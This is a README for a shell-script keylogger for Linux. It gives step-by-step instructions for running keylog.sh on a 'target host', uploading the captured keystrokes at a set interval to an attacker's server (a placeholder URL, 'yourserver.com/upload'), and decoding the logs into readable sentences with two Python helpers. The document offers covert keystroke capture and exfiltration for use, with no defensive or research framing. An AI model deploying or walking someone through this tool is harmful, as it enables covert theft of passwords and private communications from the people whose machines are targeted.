# Simple Keylog
A streamlined keylogger for Linux systems written in shell.

# How to use: 

- Edit "keylog.sh" in notepad.
- replace the upload interval with your desired amount in seconds. 
- Replace "http://yourserver.com/upload" with your own upload server url.
- Run "keylog.sh" on target host.
- "logs.txt" will upload to your server and update every X number of seconds according to your specification.
- Move "decoder.py" and "sentencer.py" to the same directory of server as "logs.txt" or create a new folder and add all files to it.
- cd to directory where both files are contained and you can either run:
```
python3 decoder.py 
```
- This will convert the captured logs into a user-readable format and output the converted version as "logs_decoded.txt" in the same directory. This version will include all the key presses and releases but may be as readable.
- Or you can run
```
python3 sentencer.py
```
- This will convert the captured logs into an even more user-readable format and output the converted version as "logs_sentenced.txt" in the same directory. This version will be readable in a sentence-like format but will exclude key releases.
  
